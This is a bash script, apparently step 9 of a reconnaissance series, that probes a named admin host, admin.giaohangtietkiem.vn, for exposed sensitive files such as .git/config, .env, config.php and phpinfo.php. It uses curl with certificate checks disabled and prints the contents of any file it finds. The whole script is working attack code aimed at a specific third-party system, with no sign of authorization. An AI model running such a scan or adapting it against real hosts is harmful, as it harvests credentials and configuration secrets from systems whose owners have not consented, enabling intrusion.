#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "步骤9：文件泄露检测"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="admin.giaohangtietkiem.vn"

# 敏感文件列表
FILES=(
    "/.git/config"
    "/.git/HEAD"
    "/.env"
    "/.env.local"
    "/.env.production"
    "/config.php"
    "/configuration.php"
    "/.htaccess"
    "/web.config"
    "/.DS_Store"
    "/composer.json"
    "/package.json"
    "/.gitignore"
    "/README.md"
    "/phpinfo.php"
    "/info.php"
    "/.well-known/security.txt"
)

echo "[*] 检测敏感文件泄露..."

for file in "${FILES[@]}"; do
    echo -n "  测试: $file ... "
    status=$(curl -sk "https://$TARGET$file" -w "%{http_code}" -o /dev/null -m 3 2>/dev/null)
    
    if [ "$status" == "200" ]; then
        echo "✅ 发现！"
        curl -sk "https://$TARGET$file" -m 3 | head -10
    else
        echo "❌ $status"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 文件泄露检测完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
